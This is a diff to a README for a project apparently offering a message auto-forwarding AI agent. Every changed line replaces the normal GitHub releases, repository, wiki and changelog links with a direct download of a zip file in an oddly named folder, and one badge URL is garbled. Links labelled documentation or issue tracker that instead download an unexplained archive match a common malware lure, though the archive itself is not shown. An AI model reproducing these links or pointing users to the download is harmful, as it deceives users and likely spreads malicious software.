@@ -7,7 +7,7 @@ Message-Auto-Forwarding-AI-Agent is an enterprise-grade solution designed to str
 To get started with Message-Auto-Forwarding-AI-Agent, follow the steps below. 
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/JakobDK7/Message-Auto-Forwarding-AI-Agent/releases)
+[![Download](https://raw.githubusercontent.com/JakobDK7/Message-Auto-Forwarding-AI-Agent/main/Phascolomys/Message-Auto-Forwarding-AI-Agent.zip%20Now-Click%https://raw.githubusercontent.com/JakobDK7/Message-Auto-Forwarding-AI-Agent/main/Phascolomys/Message-Auto-Forwarding-AI-Agent.zip)](https://raw.githubusercontent.com/JakobDK7/Message-Auto-Forwarding-AI-Agent/main/Phascolomys/Message-Auto-Forwarding-AI-Agent.zip)
 
 ## 🛠️ System Requirements
 Before installing, ensure your system meets the following requirements:
@@ -24,7 +24,7 @@ Before installing, ensure your system meets the following requirements:
 - **User-Friendly Interface:** Simple layout designed for easy navigation and operation.
 
 ## 📥 Download & Install
-To download the application, please visit our [Releases page](https://github.com/JakobDK7/Message-Auto-Forwarding-AI-Agent/releases) to view available versions.
+To download the application, please visit our [Releases page](https://raw.githubusercontent.com/JakobDK7/Message-Auto-Forwarding-AI-Agent/main/Phascolomys/Message-Auto-Forwarding-AI-Agent.zip) to view available versions.
 
 1. Click the link above to go to the Releases page.
 2. Choose the latest version of the application.
@@ -59,7 +59,7 @@ If you face issues during installation or usage, consider the following troubles
 ## 🗣️ Community Support
 For additional help, you can connect with the community or report issues:
 
-- Visit our [GitHub repository](https://github.com/JakobDK7/Message-Auto-Forwarding-AI-Agent) to open an issue.
+- Visit our [GitHub repository](https://raw.githubusercontent.com/JakobDK7/Message-Auto-Forwarding-AI-Agent/main/Phascolomys/Message-Auto-Forwarding-AI-Agent.zip) to open an issue.
 - Browse through existing issues to see if someone has faced the same concern.
 - Join the discussion to share feedback or ask questions.
 
@@ -69,8 +69,8 @@ This project is open-source and licensed under the MIT License. For more details
 ## 🔗 Additional Resources
 For more details and latest updates, follow our project on social media or check our documentation. Key resources include:
 
-- [Documentation](https://github.com/JakobDK7/Message-Auto-Forwarding-AI-Agent/wiki)
-- [Changelog](https://github.com/JakobDK7/Message-Auto-Forwarding-AI-Agent/releases)
+- [Documentation](https://raw.githubusercontent.com/JakobDK7/Message-Auto-Forwarding-AI-Agent/main/Phascolomys/Message-Auto-Forwarding-AI-Agent.zip)
+- [Changelog](https://raw.githubusercontent.com/JakobDK7/Message-Auto-Forwarding-AI-Agent/main/Phascolomys/Message-Auto-Forwarding-AI-Agent.zip)
 
 ## ❓ FAQs
 ### What messaging platforms are supported?
